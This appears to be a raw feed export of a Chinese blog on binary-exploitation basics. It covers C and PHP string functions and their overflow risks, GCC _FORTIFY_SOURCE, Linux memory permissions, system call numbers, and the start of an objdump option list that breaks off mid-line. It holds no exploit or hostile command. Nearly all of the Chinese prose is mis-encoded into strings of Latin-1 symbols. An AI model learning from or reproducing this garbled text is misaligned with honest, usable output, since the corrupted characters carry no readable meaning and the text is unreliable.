class="title function_">memset</span><span class="params">(<span class="type">void</span> *str, <span class="type">int</span> c, <span class="type">size_t</span> n)</span></span><br><span class="line">     å¤åˆ¶å­—ç¬¦ cï¼ˆä¸€ä¸ªæ— ç¬¦å·å­—ç¬¦ï¼‰åˆ°å‚æ•° str æ‰€æŒ‡å‘çš„å­—ç¬¦ä¸²çš„å‰ n ä¸ªå­—ç¬¦</span><br><span class="line">  å‚æ•°ï¼šstr -- æŒ‡å‘è¦å¡«å……çš„å†…å­˜å—</span><br><span class="line">     c -- è¦è¢«è®¾ç½®çš„å€¼ã€‚è¯¥å€¼ä»¥ <span class="type">int</span> å½¢å¼ä¼ é€’ï¼Œä½†æ˜¯å‡½æ•°åœ¨å¡«å……å†…å­˜å—æ—¶æ˜¯ä½¿ç”¨è¯¥å€¼çš„æ— ç¬¦å·å­—ç¬¦å½¢å¼</span><br><span class="line">     n -- è¦è¢«è®¾ç½®ä¸ºè¯¥å€¼çš„å­—èŠ‚æ•°</span><br><span class="line">  è¿”å›å€¼ï¼šè¯¥å€¼è¿”å›ä¸€ä¸ªæŒ‡å‘å­˜å‚¨åŒº str çš„æŒ‡é’ˆ</span><br><span class="line">---------------------------------------------------------------------------------------</span><br><span class="line">&gt;&gt;&gt; <span class="title function_">strcpy</span><span class="params">()</span>:</span><br><span class="line">  æè¿°ï¼š<span class="type">char</span> *<span class="title function_">strcpy</span><span class="params">(<span class="type">char</span> *dest, <span class="type">const</span> <span class="type">char</span> *src)</span></span><br><span class="line">     æŠŠ src æ‰€æŒ‡å‘çš„å­—ç¬¦ä¸²å¤åˆ¶åˆ° destï¼Œå®¹æ˜“å‡ºç°æº¢å‡º</span><br><span class="line">  å‚æ•°ï¼šdest -- æŒ‡å‘ç”¨äºå­˜å‚¨å¤åˆ¶å†…å®¹çš„ç›®æ ‡æ•°ç»„</span><br><span class="line">     src -- è¦å¤åˆ¶çš„å­—ç¬¦ä¸²</span><br><span class="line">  è¿”å›å€¼ï¼šè¯¥å‡½æ•°è¿”å›ä¸€ä¸ªæŒ‡å‘æœ€ç»ˆçš„ç›®æ ‡å­—ç¬¦ä¸² dest çš„æŒ‡é’ˆ</span><br><span class="line">--------------------------------------------------------------------------------------</span><br><span class="line">&gt;&gt;&gt; <span class="title function_">stpcpy</span><span class="params">()</span>:</span><br><span class="line">  æè¿°ï¼š<span class="keyword">extern</span> <span class="type">char</span> *<span class="title function_">stpcpy</span><span class="params">(<span class="type">char</span> *dest,<span class="type">char</span> *src)</span></span><br><span class="line">     æŠŠsrcæ‰€æŒ‡ç”±<span class="literal">NULL</span>å€Ÿå®¿çš„å­—ç¬¦ä¸²å¤åˆ¶åˆ°destæ‰€æŒ‡çš„æ•°ç»„ä¸­</span><br><span class="line">  è¯´æ˜ï¼šsrcå’Œdestæ‰€æŒ‡å†…å­˜åŒºåŸŸä¸å¯ä»¥é‡å ä¸”destå¿…é¡»æœ‰è¶³å¤Ÿçš„ç©ºé—´æ¥å®¹çº³srcçš„å­—ç¬¦ä¸²è¿”å›æŒ‡å‘destç»“å°¾å¤„å­—ç¬¦ï¼ˆ<span class="literal">NULL</span>ï¼‰çš„æŒ‡é’ˆ </span><br><span class="line">  è¿”å›å€¼ï¼š</span><br><span class="line">---------------------------------------------------------------------------------------    </span><br><span class="line">&gt;&gt;&gt; <span class="title function_">strncpy</span><span class="params">()</span>:</span><br><span class="line">  æè¿°ï¼š<span class="type">char</span> *<span class="title function_">strncpy</span><span class="params">(<span class="type">char</span> *dest, <span class="type">const</span> <span class="type">char</span> *src, <span class="type">size_t</span> n)</span></span><br><span class="line">     æŠŠ src æ‰€æŒ‡å‘çš„å­—ç¬¦ä¸²å¤åˆ¶åˆ° destï¼Œæœ€å¤šå¤åˆ¶ n ä¸ªå­—ç¬¦ã€‚å½“ src çš„é•¿åº¦å°äº n æ—¶ï¼Œdest çš„å‰©ä½™éƒ¨åˆ†å°†ç”¨ç©ºå­—èŠ‚å¡«å……</span><br><span class="line">  å‚æ•°ï¼šdest -- æŒ‡å‘ç”¨äºå­˜å‚¨å¤åˆ¶å†…å®¹çš„ç›®æ ‡æ•°ç»„</span><br><span class="line">     src -- è¦å¤åˆ¶çš„å­—ç¬¦ä¸²</span><br><span class="line">     n -- è¦ä»æºä¸­å¤åˆ¶çš„å­—ç¬¦æ•°</span><br><span class="line">  è¿”å›å€¼ï¼šè¯¥å‡½æ•°è¿”å›æœ€ç»ˆå¤åˆ¶çš„å­—ç¬¦ä¸²</span><br><span class="line">---------------------------------------------------------------------------------------</span><br><span class="line">&gt;&gt;&gt; <span class="title function_">strcat</span><span class="params">()</span>:</span><br><span class="line">  æè¿°ï¼š<span class="type">char</span> *<span class="title function_">strcat</span><span class="params">(<span class="type">char</span> *dest, <span class="type">const</span> <span class="type">char</span> *src)</span></span><br><span class="line">     æŠŠ src æ‰€æŒ‡å‘çš„å­—ç¬¦ä¸²è¿½åŠ åˆ° dest æ‰€æŒ‡å‘çš„å­—ç¬¦ä¸²çš„ç»“å°¾</span><br><span class="line">  å‚æ•°ï¼šdest -- æŒ‡å‘ç›®æ ‡æ•°ç»„ï¼Œè¯¥æ•°ç»„åŒ…å«äº†ä¸€ä¸ª C å­—ç¬¦ä¸²ï¼Œä¸”è¶³å¤Ÿå®¹çº³è¿½åŠ åçš„å­—ç¬¦ä¸²</span><br><span class="line">     src -- æŒ‡å‘è¦è¿½åŠ çš„å­—ç¬¦ä¸²ï¼Œè¯¥å­—ç¬¦ä¸²ä¸ä¼šè¦†ç›–ç›®æ ‡å­—ç¬¦ä¸²</span><br><span class="line">  è¿”å›å€¼ï¼š</span><br><span class="line">---------------------------------------------------------------------------------------</span><br><span class="line">&gt;&gt;&gt; <span class="title function_">strncat</span><span class="params">()</span>:</span><br><span class="line">  æè¿°ï¼š<span class="type">char</span> *<span class="title function_">strncat</span><span class="params">(<span class="type">char</span> *dest, <span class="type">const</span> <span class="type">char</span> *src, <span class="type">size_t</span> n)</span></span><br><span class="line">     æŠŠ src æ‰€æŒ‡å‘çš„å­—ç¬¦ä¸²è¿½åŠ åˆ° dest æ‰€æŒ‡å‘çš„å­—ç¬¦ä¸²çš„ç»“å°¾ï¼Œç›´åˆ° n å­—ç¬¦é•¿åº¦ä¸ºæ­¢</span><br><span class="line">  å‚æ•°ï¼šdest -- æŒ‡å‘ç›®æ ‡æ•°ç»„ï¼Œè¯¥æ•°ç»„åŒ…å«äº†ä¸€ä¸ª C å­—ç¬¦ä¸²ï¼Œä¸”è¶³å¤Ÿå®¹çº³è¿½åŠ åçš„å­—ç¬¦ä¸²ï¼ŒåŒ…æ‹¬é¢å¤–çš„ç©ºå­—ç¬¦</span><br><span class="line">     src -- è¦è¿½åŠ çš„å­—ç¬¦ä¸²</span><br><span class="line">     n -- è¦è¿½åŠ çš„æœ€å¤§å­—ç¬¦æ•°</span><br><span class="line">  è¿”å›å€¼ï¼šè¯¥å‡½æ•°è¿”å›ä¸€ä¸ªæŒ‡å‘æœ€ç»ˆçš„ç›®æ ‡å­—ç¬¦ä¸² dest çš„æŒ‡é’ˆ</span><br><span class="line">---------------------------------------------------------------------------------------</span><br><span class="line">&gt;&gt;&gt; <span class="title function_">sprintf</span><span class="params">()</span>:PHP</span><br><span class="line">  æè¿°ï¼š<span class="title function_">sprintf</span><span class="params">(format,arg1,arg2,arg++)</span></span><br><span class="line">     arg1ã€arg2ã€++ å‚æ•°å°†è¢«æ’å…¥åˆ°ä¸»å­—ç¬¦ä¸²ä¸­çš„ç™¾åˆ†å·ï¼ˆ%ï¼‰ç¬¦å·å¤„ã€‚è¯¥å‡½æ•°æ˜¯é€æ­¥æ‰§è¡Œçš„ã€‚åœ¨ç¬¬ä¸€ä¸ª % ç¬¦å·å¤„ï¼Œæ’å…¥ arg1ï¼Œåœ¨ç¬¬äºŒä¸ª % ç¬¦å·å¤„ï¼Œæ’å…¥ arg2ï¼Œä¾æ­¤ç±»æ¨</span><br><span class="line">  å‚æ•°ï¼šformat -- å¿…éœ€ã€‚è§„å®šå­—ç¬¦ä¸²ä»¥åŠå¦‚ä½•æ ¼å¼åŒ–å…¶ä¸­çš„å˜é‡</span><br><span class="line">     arg1 -- å¿…éœ€ã€‚è§„å®šæ’åˆ° format å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€ä¸ª % ç¬¦å·å¤„çš„å‚</span><br><span class="line">     arg2 -- å¯é€‰ã€‚è§„å®šæ’åˆ° format å­—ç¬¦ä¸²ä¸­ç¬¬äºŒä¸ª % ç¬¦å·å¤„çš„å‚æ•°</span><br><span class="line">     arg++ -- å¯é€‰ã€‚è§„å®šæ’åˆ° format å­—ç¬¦ä¸²ä¸­ç¬¬ä¸‰ã€å››ç­‰ç­‰ % ç¬¦å·å¤„çš„å‚æ•°</span><br><span class="line">  è¿”å›å€¼ï¼šè¿”å›å·²æ ¼å¼åŒ–çš„å­—ç¬¦ä¸²</span><br><span class="line">-----------------------------------------------------------------------</span><br><span class="line">&gt;&gt;&gt; <span class="title function_">snprintf</span><span class="params">()</span>:</span><br><span class="line">  æè¿°ï¼š<span class="type">int</span> <span class="title function_">snprintf</span> <span class="params">( <span class="type">char</span> * str, <span class="type">size_t</span> size, <span class="type">const</span> <span class="type">char</span> * format, ... )</span></span><br><span class="line">     è®¾å°†å¯å˜å‚æ•°<span class="params">(...)</span>æŒ‰ç…§ format æ ¼å¼åŒ–æˆå­—ç¬¦ä¸²ï¼Œå¹¶å°†å­—ç¬¦ä¸²å¤åˆ¶åˆ° str ä¸­ï¼Œsize ä¸ºè¦å†™å…¥çš„å­—ç¬¦çš„æœ€å¤§æ•°ç›®ï¼Œè¶…è¿‡ size ä¼šè¢«æˆªæ–­</span><br><span class="line">  å‚æ•°ï¼šstr -- ç›®æ ‡å­—ç¬¦ä¸²</span><br><span class="line">     size -- æ‹·è´å­—èŠ‚æ•°<span class="params">(Bytes)</span>å¦‚æœæ ¼å¼åŒ–åçš„å­—ç¬¦ä¸²é•¿åº¦å¤§äº size</span><br><span class="line">     format -- æ ¼å¼åŒ–æˆå­—ç¬¦ä¸²</span><br><span class="line">  è¿”å›å€¼ï¼šå¦‚æœæ ¼å¼åŒ–åçš„å­—ç¬¦ä¸²é•¿åº¦å°äºç­‰äº sizeï¼Œåˆ™ä¼šæŠŠå­—ç¬¦ä¸²å…¨éƒ¨å¤åˆ¶åˆ° str ä¸­ï¼Œå¹¶ç»™å…¶åæ·»åŠ ä¸€ä¸ªå­—ç¬¦ä¸²ç»“æŸç¬¦ \0ã€‚ å¦‚æœæ ¼å¼åŒ–åçš„å­—ç¬¦ä¸²é•¿åº¦å¤§äº sizeï¼Œè¶…è¿‡ size çš„éƒ¨åˆ†ä¼šè¢«æˆªæ–­ï¼Œåªå°†å…¶ä¸­çš„ <span class="params">(size<span class="number">-1</span>)</span> ä¸ªå­—ç¬¦å¤åˆ¶åˆ° str ä¸­ï¼Œå¹¶ç»™å…¶åæ·»åŠ ä¸€ä¸ªå­—ç¬¦ä¸²ç»“æŸç¬¦ \0ï¼Œè¿”å›å€¼ä¸ºæ¬²å†™å…¥çš„å­—ç¬¦ä¸²é•¿åº¦</span><br><span class="line">---------------------------------------------------------------------------------------</span><br><span class="line">&gt;&gt;&gt; <span class="title function_">vsprintf</span><span class="params">()</span>:PHP</span><br><span class="line">  æè¿°ï¼š<span class="title function_">vsprintf</span><span class="params">(format,argarray)</span> </span><br><span class="line">     ä¸ <span class="title function_">sprintf</span><span class="params">()</span> ä¸åŒï¼Œ<span class="title function_">vsprintf</span><span class="params">()</span> ä¸­çš„å‚æ•°ä½äºæ•°ç»„ä¸­ã€‚æ•°ç»„å…ƒç´ å°†è¢«æ’å…¥åˆ°ä¸»å­—ç¬¦ä¸²ä¸­çš„ç™¾åˆ†å·ï¼ˆ%ï¼‰ç¬¦å·å¤„ã€‚è¯¥å‡½æ•°æ˜¯é€æ­¥æ‰§è¡Œçš„</span><br><span class="line">  å‚æ•°ï¼šformat -- å¿…éœ€ã€‚è§„å®šå­—ç¬¦ä¸²ä»¥åŠå¦‚ä½•æ ¼å¼åŒ–å…¶ä¸­çš„å˜é‡</span><br><span class="line">     argarray -- å¿…éœ€ã€‚å¸¦æœ‰å‚æ•°çš„ä¸€ä¸ªæ•°ç»„ï¼Œè¿™äº›å‚æ•°ä¼šè¢«æ’åˆ° format å­—ç¬¦ä¸²ä¸­çš„ % ç¬¦å·å¤„</span><br><span class="line">  è¿”å›å€¼ï¼šä»¥æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„å½¢å¼è¿”å›æ•°ç»„å€¼</span><br><span class="line">---------------------------------------------------------------------------------------</span><br><span class="line">&gt;&gt;&gt; <span class="title function_">vsnprintf</span><span class="params">()</span>:</span><br><span class="line">  æè¿°ï¼š<span class="type">int</span> <span class="title function_">vsnprintf</span> <span class="params">(<span class="type">char</span> * s, <span class="type">size_t</span> n, <span class="type">const</span> <span class="type">char</span> * format, va_list arg )</span></span><br><span class="line">     å°†æ ¼å¼åŒ–æ•°æ®ä»å¯å˜å‚æ•°åˆ—è¡¨å†™å…¥å¤§å°ç¼“å†²åŒº</span><br><span class="line">å¦‚æœåœ¨<span class="built_in">printf</span>ä¸Šä½¿ç”¨æ ¼å¼ï¼Œåˆ™ä½¿ç”¨ç›¸åŒçš„æ–‡æœ¬ç»„æˆå­—ç¬¦ä¸²ï¼Œä½†ä½¿ç”¨ç”±argæ ‡è¯†çš„å˜é‡å‚æ•°åˆ—è¡¨ä¸­çš„å…ƒç´ è€Œä¸æ˜¯é™„åŠ çš„å‡½æ•°å‚æ•°ï¼Œå¹¶å°†ç»“æœå†…å®¹ä½œä¸ºCå­—ç¬¦ä¸²å­˜å‚¨åœ¨sæŒ‡å‘çš„ç¼“å†²åŒºä¸­ ï¼ˆä»¥nä¸ºæœ€å¤§ç¼“å†²åŒºå®¹é‡æ¥å¡«å……ï¼‰ã€‚å¦‚æœç»“æœå­—ç¬¦ä¸²çš„é•¿åº¦è¶…è¿‡äº†n-1ä¸ªå­—ç¬¦ï¼Œåˆ™å‰©ä½™çš„å­—ç¬¦å°†è¢«ä¸¢å¼ƒå¹¶ä¸”ä¸è¢«å­˜å‚¨ï¼Œè€Œæ˜¯è¢«è®¡ç®—ä¸ºå‡½æ•°è¿”å›çš„å€¼ã€‚åœ¨å†…éƒ¨ï¼Œå‡½æ•°ä»argæ ‡è¯†çš„åˆ—è¡¨ä¸­æ£€ç´¢å‚æ•°ï¼Œå°±å¥½åƒva_argè¢«ä½¿ç”¨äº†ä¸€æ ·ï¼Œå› æ­¤argçš„çŠ¶æ€å¾ˆå¯èƒ½è¢«è°ƒç”¨æ‰€æ”¹å˜ã€‚åœ¨ä»»ä½•æƒ…å†µä¸‹ï¼Œargéƒ½åº”è¯¥åœ¨è°ƒç”¨ä¹‹å‰çš„æŸä¸ªæ—¶åˆ»ç”±va_startåˆå§‹åŒ–ï¼Œå¹¶ä¸”åœ¨è°ƒç”¨ä¹‹åçš„æŸä¸ªæ—¶åˆ»ï¼Œé¢„è®¡ä¼šç”±va_endé‡Šæ”¾</span><br><span class="line">  å‚æ•°ï¼šs -- æŒ‡å‘å­˜å‚¨ç»“æœCå­—ç¬¦ä¸²çš„ç¼“å†²åŒºçš„æŒ‡é’ˆï¼Œç¼“å†²åŒºåº”è‡³å°‘æœ‰nä¸ªå­—ç¬¦çš„å¤§å°</span><br><span class="line">     n -- åœ¨ç¼“å†²åŒºä¸­ä½¿ç”¨çš„æœ€å¤§å­—èŠ‚æ•°ï¼Œç”Ÿæˆçš„å­—ç¬¦ä¸²çš„é•¿åº¦è‡³å¤šä¸ºn-1ï¼Œä¸ºé¢å¤–çš„ç»ˆæ­¢ç©ºå­—ç¬¦ç•™ä¸‹ç©ºï¼Œ<span class="type">size_t</span>æ˜¯ä¸€ä¸ªæ— ç¬¦å·æ•´æ•°ç±»å‹</span><br><span class="line">     format -- åŒ…å«æ ¼å¼å­—ç¬¦ä¸²çš„Cå­—ç¬¦ä¸²ï¼Œå…¶æ ¼å¼å­—ç¬¦ä¸²ä¸<span class="built_in">printf</span>ä¸­çš„æ ¼å¼ç›¸åŒ</span><br><span class="line">      arg -- æ ‡è¯†ä½¿ç”¨va_startåˆå§‹åŒ–çš„å˜é‡å‚æ•°åˆ—è¡¨çš„å€¼</span><br><span class="line">  è¿”å›å€¼ï¼šå¦‚æœnè¶³å¤Ÿå¤§ï¼Œåˆ™ä¼šå†™å…¥çš„å­—ç¬¦æ•°ï¼Œä¸åŒ…æ‹¬ç»ˆæ­¢ç©ºå­—ç¬¦ã€‚å¦‚æœå‘ç”Ÿç¼–ç é”™è¯¯ï¼Œåˆ™è¿”å›è´Ÿæ•°ã€‚æ³¨æ„ï¼Œåªæœ‰å½“è¿™ä¸ªè¿”å›å€¼æ˜¯éè´Ÿå€¼ä¸”å°äºnæ—¶ï¼Œå­—ç¬¦ä¸²æ‰è¢«å®Œå…¨å†™å…¥</span><br><span class="line">---------------------------------------------------------------------------------------</span><br><span class="line">&gt;&gt;&gt; <span class="title function_">gets</span><span class="params">()</span>:</span><br><span class="line">  æè¿°ï¼š<span class="type">char</span> *<span class="title function_">gets</span><span class="params">(<span class="type">char</span> *str)</span></span><br><span class="line">     ä»æ ‡å‡†è¾“å…¥ <span class="built_in">stdin</span> è¯»å–ä¸€è¡Œï¼Œå¹¶æŠŠå®ƒå­˜å‚¨åœ¨ str æ‰€æŒ‡å‘çš„å­—ç¬¦ä¸²ä¸­ã€‚å½“è¯»å–åˆ°æ¢è¡Œç¬¦æ—¶ï¼Œæˆ–è€…åˆ°è¾¾æ–‡ä»¶æœ«å°¾æ—¶ï¼Œå®ƒä¼šåœæ­¢ï¼Œå…·ä½“è§†æƒ…å†µè€Œå®š</span><br><span class="line">  å‚æ•°ï¼šstr -- è¿™æ˜¯æŒ‡å‘ä¸€ä¸ªå­—ç¬¦æ•°ç»„çš„æŒ‡é’ˆï¼Œè¯¥æ•°ç»„å­˜å‚¨äº† C å­—ç¬¦ä¸²</span><br><span class="line">  è¿”å›å€¼ï¼šå¦‚æœæˆåŠŸï¼Œè¯¥å‡½æ•°è¿”å› strã€‚å¦‚æœå‘ç”Ÿé”™è¯¯æˆ–è€…åˆ°è¾¾æ–‡ä»¶æœ«å°¾æ—¶è¿˜æœªè¯»å–ä»»ä½•å­—ç¬¦ï¼Œåˆ™è¿”å› <span class="literal">NULL</span> </span><br><span class="line"></span><br></pre></td></tr></table></figure></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//GCCç”¨æ³•</span></span><br><span class="line">gcc -D_FORTIFY_SOURCE=<span class="number">1</span>  ä»…ä»…åªåœ¨ç¼–è¯‘æ—¶è¿›è¡Œæ£€æŸ¥ï¼ˆå°¤å…¶æ˜¯<span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span>è¿™ç§æ–‡ä»¶å¤´ï¼‰</span></span><br><span class="line">gcc -D_FORTIFY_SOURCE=<span class="number">2</span>  ç¨‹åºæ‰§è¡Œæ—¶ä¹Ÿä¼šè¿›è¡Œæ£€æŸ¥ï¼ˆå¦‚æœæ£€æŸ¥åˆ°ç¼“å†²åŒºæº¢å‡ºï¼Œå°±ä¼šç»ˆæ­¢ç¨‹åºï¼‰</span><br></pre></td></tr></table></figure><p>åœ¨-D_FORTIFY_SOURCE=2æ—¶ï¼Œé€šè¿‡å¯¹æ•°ç»„å¤§å°æ¥åˆ¤æ–­æ›¿æ¢strcpyã€memcpyã€memsetç­‰å‡½æ•°åï¼Œä»è€Œè¾¾åˆ°é˜²æ­¢ç¼“å†²åŒºæº¢å‡ºçš„ä½œç”¨</p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWNåŸºç¡€-something_about_linux</title>
      <link href="/2025/02/06/PWN%E5%9F%BA%E7%A1%80-something-about-linux/"/>
      <url>/2025/02/06/PWN%E5%9F%BA%E7%A1%80-something-about-linux/</url>
      
        <content type="html"><![CDATA[<h2 id="æ–‡ä»¶æƒé™"><a href="#æ–‡ä»¶æƒé™" class="headerlink" title="æ–‡ä»¶æƒé™"></a>æ–‡ä»¶æƒé™</h2><p>â€Œ<strong>rwxpåˆ†åˆ«æŒ‡Linuxè™šæ‹Ÿå†…å­˜æƒé™çš„ä¸åŒéƒ¨åˆ†ï¼Œå…·ä½“å«ä¹‰å¦‚ä¸‹</strong>â€Œ</p><ul><li>â€Œ<strong>r</strong>â€Œï¼šè¯»æƒé™ï¼ˆReadï¼‰ï¼Œè¡¨ç¤ºå¯ä»¥è¯»å–å†…å­˜åŒºåŸŸçš„å†…å®¹ã€‚</li><li>â€Œ<strong>w</strong>â€Œï¼šå†™æƒé™ï¼ˆWriteï¼‰ï¼Œè¡¨ç¤ºå¯ä»¥ä¿®æ”¹å†…å­˜åŒºåŸŸçš„å†…å®¹ã€‚</li><li>â€Œ<strong>x</strong>â€Œï¼šæ‰§è¡Œæƒé™ï¼ˆExecuteï¼‰ï¼Œè¡¨ç¤ºå¯ä»¥æ‰§è¡Œå†…å­˜åŒºåŸŸä¸­çš„ä»£ç ã€‚</li><li>â€Œ<strong>p</strong>â€Œï¼šç§æœ‰æƒé™ï¼ˆPrivateï¼‰ï¼Œè¡¨ç¤ºè¯¥å†…å­˜åŒºåŸŸçš„å†…å®¹åœ¨è¿›ç¨‹é—´æ˜¯ç§æœ‰çš„ï¼Œå…¶ä»–è¿›ç¨‹æ— æ³•è®¿é—®ã€‚<h2 id="ç³»ç»Ÿè°ƒç”¨å·"><a href="#ç³»ç»Ÿè°ƒç”¨å·" class="headerlink" title="ç³»ç»Ÿè°ƒç”¨å·"></a>ç³»ç»Ÿè°ƒç”¨å·</h2>åœ¨Linuxä¸­ï¼Œæ¯ä¸ªç³»ç»Ÿè°ƒç”¨è¢«èµ‹äºˆä¸€ä¸ªç³»ç»Ÿè°ƒç”¨å·ã€‚è¿™æ ·ï¼Œé€šè¿‡ç‹¬ä¸€æ— äºŒçš„å·å°±å¯ä»¥å…³è”ç³»ç»Ÿè°ƒç”¨ã€‚å½“ç”¨æˆ·ç©ºé—´çš„è¿›ç¨‹æ‰§è¡Œä¸€ä¸ªç³»ç»Ÿè°ƒç”¨çš„æ—¶å€™ï¼Œè¿™ä¸ªç³»ç»Ÿè°ƒç”¨å·å°±ç”¨æ¥æŒ‡æ˜åˆ°åº•æ˜¯è¦æ‰§è¡Œå“ªä¸ªç³»ç»Ÿè°ƒç”¨ï¼›è¿›ç¨‹ä¸ä¼šæåŠç³»ç»Ÿè°ƒç”¨çš„åç§°ã€‚</li></ul><p>ç³»ç»Ÿè°ƒç”¨å·ç›¸å½“é‡è¦ï¼Œä¸€æ—¦åˆ†é…å°±ä¸èƒ½å†åˆä»»ä½•å˜æ›´ï¼Œå¦åˆ™ç¼–è¯‘å¥½çš„åº”ç”¨ç¨‹åºå°±ä¼šå´©æºƒã€‚æ­¤å¤–ï¼Œå¦‚æœä¸€ä¸ªç³»ç»Ÿè°ƒç”¨è¢«åˆ é™¤ï¼Œå®ƒæ‰€å ç”¨çš„ç³»ç»Ÿè°ƒç”¨å·ä¹Ÿä¸å…è®¸è¢«å›æ”¶åˆ©ç”¨ï¼Œå¦åˆ™ï¼Œä»¥å‰ç¼–è¯‘è¿‡çš„ä»£ç ä¼šè°ƒç”¨è¿™ä¸ªç³»ç»Ÿè°ƒç”¨ï¼Œä½†äº‹å®ä¸Šå´è°ƒç”¨çš„æ˜¯å¦å¤–ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨ã€‚</p><blockquote><p>Linuxæœ‰ä¸€ä¸ªâ€œæœªå®ç°â€ç³»ç»Ÿè°ƒç”¨sys_ni_syscall(),å®ƒé™¤äº†è¿”å›-ENOSYSå¤–ä¸åšä»»ä½•å…¶ä»–å·¥ä½œï¼Œè¿™ä¸ªé”™è¯¯å·å°±æ˜¯ä¸“é—¨é’ˆå¯¹æ— æ•ˆçš„ç³»ç»Ÿè°ƒç”¨è€Œè®¾çš„ã€‚è™½ç„¶å¾ˆç½•è§ï¼Œä½†å¦‚æœä¸€ä¸ªç³»ç»Ÿè°ƒç”¨è¢«åˆ é™¤ï¼Œæˆ–è€…å˜å¾—ä¸å¯ç”¨ï¼Œè¿™ä¸ªå‡½æ•°å°±è¦è´Ÿè´£â€œå¡«è¡¥ç©ºç¼ºâ€</p></blockquote><p>å†…æ ¸è®°å½•äº†ç³»ç»Ÿè°ƒç”¨è¡¨ä¸­çš„æ‰€æœ‰å·²æ³¨å†Œè¿‡çš„ç³»ç»Ÿè°ƒç”¨çš„åˆ—è¡¨ï¼Œå­˜å‚¨åœ¨sys_call_tableä¸­ã€‚æ¯ä¸€ç§ä½“ç³»ç»“æ„ä¸­ï¼Œéƒ½æ˜ç¡®å®šä¹‰äº†è¿™ä¸ªè¡¨ã€‚è¿™ä¸ªè¡¨ä¸ºæ¯ä¸€ä¸ªæœ‰æ•ˆçš„ç³»ç»Ÿè°ƒç”¨æŒ‡å®šäº†å”¯ä¸€çš„ç³»ç»Ÿè°ƒç”¨å·<br><a href="https://blog.csdn.net/qq_41202237/article/details/107249667">Linux32ä½ç³»ç»Ÿè°ƒç”¨å·</a><br><a href="https://hollk.blog.csdn.net/article/details/107250349">Linux64ä½ç³»ç»Ÿè°ƒç”¨å·</a></p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å·¥å…·ç¯‡Â·objdump</title>
      <link href="/2025/02/04/%E5%B7%A5%E5%85%B7%E7%AF%87%C2%B7objdump/"/>
      <url>/2025/02/04/%E5%B7%A5%E5%85%B7%E7%AF%87%C2%B7objdump/</url>
      
        <content type="html"><![CDATA[<p>objdump å‘½ä»¤æ˜¯ <a href="https://www.gnu.org/software/binutils/">GNU Binutils</a> äºŒè¿›åˆ¶å·¥å…·é›†çš„ä¸€å‘˜ï¼Œç”¨äºæŸ¥çœ‹ç›®æ ‡æ–‡ä»¶æˆ–å¯æ‰§è¡Œæ–‡ä»¶çš„ç»„æˆä¿¡æ¯ï¼Œä»¥å¯è¯»çš„å½¢å¼æ‰“å°äºŒè¿›åˆ¶æ–‡ä»¶çš„å†…å®¹ã€‚<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">objdump [options] obj_file <span class="comment">#[]è¡¨ç¤ºå¯é€‰ï¼Œobj_fileè¡¨ç¤ºç›®æ ‡æ–‡ä»¶</span></span><br></pre></td></tr></table></figure></p><h4 id="å¸¸ç”¨"><a href="#å¸¸ç”¨" class="headerlink" title="å¸¸ç”¨"></a>å¸¸ç”¨</h4><p><code>objdump -T libc.so.6 |grep system</code></p><h2 id="objdumpå‚æ•°"><a href="#objdumpå‚æ•°" class="headerlink" title="objdumpå‚æ•°"></a>objdumpå‚æ•°</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-a, --archive-headers</span><br><span class="line">æ˜¾ç¤ºæ¡£æ¡ˆå¤´ä¿¡æ¯ï¼Œå±•ç¤ºæ¡£æ¡ˆæ¯ä¸€ä¸ªæˆå‘˜çš„æ–‡ä»¶æ ¼å¼ã€‚æ•ˆæœç­‰åŒäºå‘½ä»¤ ar -tv</span><br><span class="line">-b, --target=BFDNAME</span><br><span class="line">æŒ‡å®šç›®æ ‡ç æ ¼å¼ã€‚è¿™ä¸æ˜¯å¿…é¡»çš„ï¼Œobjdump èƒ½è‡ªåŠ¨è¯†åˆ«è®¸å¤šæ ¼å¼ï¼Œæ¯”å¦‚ objdump -b oasys -m vax -h fu.o æ˜¾ç¤º fu.o çš„å¤´éƒ¨æ‘˜è¦ä¿¡æ¯ï¼Œæ˜ç¡®æŒ‡å‡ºè¯¥æ–‡ä»¶æ˜¯ Vax ç³»ç»Ÿä¸‹ç”¨ Oasys ç¼–è¯‘å™¨ç”Ÿæˆçš„ç›®æ ‡æ–‡ä»¶ã€‚objdump -i å°†ç»™å‡ºè¿™é‡Œå¯ä»¥æŒ‡å®šçš„ç›®æ ‡ç æ ¼å¼åˆ—è¡¨</span><br><span class="line">-C, --demangle[=STYLE]</span><br><span class="line">ç›®æ ‡æ–‡ä»¶ä¸­çš„ç¬¦å·è§£ç æˆç”¨æˆ·çº§åç§°ã€‚æ¯”å¦‚ç§»é™¤ç¬¦å·ä¿®é¥°æ—¶åœ¨å˜é‡ä¸å‡½æ•°åå‰æ·»åŠ çš„ä¸‹åˆ’çº¿ç­‰ã€‚</span><br><span class="line">-d, --disassemble</span><br><span class="line">åæ±‡ç¼–ç›®æ ‡æ–‡ä»¶ï¼Œå°†æœºå™¨æŒ‡ä»¤åæ±‡ç¼–æˆæ±‡ç¼–ä»£ç </span><br><span class="line">-D, --disassemble-all</span><br><span class="line">ä¸ -d ç±»ä¼¼ï¼Œä½†åæ±‡ç¼–æ‰€æœ‰æ®µï¼ˆsectionï¼‰</span><br><span class="line">-z, --disassemble-zeroes</span><br><span class="line">ä¸€èˆ¬åæ±‡ç¼–è¾“å‡ºå°†çœç•¥é›¶å—ï¼Œè¯¥é€‰é¡¹ä½¿å¾—è¿™äº›é›¶å—ä¹Ÿè¢«åæ±‡ç¼– </span><br><span class="line">-EB, -EL,--endian=&#123;big | little&#125;</span><br><span class="line">æŒ‡å®šç›®æ ‡æ–‡ä»¶çš„å­—èŠ‚åºï¼Œåœ¨ç›®æ ‡æ–‡ä»¶æ²¡æè¿°å­—èŠ‚åºæ—¶å¾ˆæœ‰ç”¨ï¼Œä¾‹å¦‚ 